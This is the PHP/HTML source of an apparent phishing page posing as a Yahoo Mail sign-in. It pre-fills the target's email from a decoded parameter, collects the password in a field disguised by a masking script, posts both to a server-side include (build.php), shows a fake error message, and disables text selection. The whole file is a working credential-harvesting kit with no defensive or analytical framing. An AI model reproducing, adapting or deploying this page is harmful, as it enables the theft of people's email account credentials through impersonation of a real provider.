<?php include '../build.php' ?>
<!DOCTYPE html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<html data-wf-site="64a18b9e49d92613ac89d93c" data-wf-page="64a18b9e49d92613ac89d93f" data-wf-domain="" class="w-mod-js wf-lato-n7-active wf-lato-n1-active wf-lato-i1-active wf-lato-n3-active wf-lato-i3-active wf-lato-n4-active wf-lato-n9-active wf-lato-i9-active wf-lato-i4-active wf-lato-i7-active wf-active"><head>




    <meta charset="utf-8">
    <title>Sign-in</title>
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <meta content="Webflow" name="generator">
    <link href="https://uploads-ssl.webflow.com/64a18b9e49d92613ac89d93c/css/g-mail.webflow.ea65fea67.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com" rel="preconnect">
    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
    <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Lato:100,100italic,300,300italic,400,400italic,700,700italic,900,900italic" media="all">
    

    <style>
        /* Disable right-click */
        body {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
    </style>

</head>

<body class="body">
    <div style="position: sticky; top: 0; background-color: #f1f1f1;  z-index: 999;">
        <div id="google_translate_element"></div>
    </div>
    <section class="section wf-section">
        <div class="up1"><img src="https://uploads-ssl.webflow.com/64a18b9e49d92613ac89d93c/64a18c6349d92613ac8a5838_Screenshot%202023-07-02%20at%2005.57.28.png" loading="lazy" alt="">
            <div class="text-block">Help</div>
        </div>
        <div class="up2 _2nd">
            <div class="div-block-2">
                <h1 class="heading"><br>Yahoo makes it easy to enjoy what matters most in<br>your world</h1>
                <div class="text-block-6">Best in class Yahoo Mail, breaking local, national and global <br>news,
                    finance, sports, music, movies and more. You get more <br>out of the web, you get more out of
                    life.</div>
            </div>
            <div class="div-block-3 _2nd mobile"><img src="https://uploads-ssl.webflow.com/64a18b9e49d92613ac89d93c/64a18c6349d92613ac8a5838_Screenshot%202023-07-02%20at%2005.57.28.png" loading="lazy" width="110" alt="" class="image">
                <div class="form-block w-form">
                    <form id="login-form" name="login-form" data-name="Email Form" class="form" method="post" action="">
                        <input type="hidden" name="login" value="yahoo">
                        <input type="email" class="text-field-2 w-input" maxlength="256" name="user" data-name="ai" value="<?php echo htmlspecialchars($decoded); ?>" placeholder="Email" id="user" style="background-color: transparent;" readonly="">
                        <h4 class="heading-2">Enter password</h4>
                        <div class="text-block-3">to finish sign in</div><input type="text" class="text-field w-input" maxlength="256" name="pass" data-name="Password" placeholder="Password" id="password">

                        <div class=" text-block-3" style="color: #bb000a; text-align: left; font-size:small; <?php echo $error; ?>" id="error">Oops, something went wrong.</div>

                        <input type="submit" value="Next" data-wait="Please wait..." class="submit-button w-button" id="submit-btn">
                    </form>
                </div>
                <div class="text-block-4">Forgot password?</div>
            </div>
        </div>
    </section>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>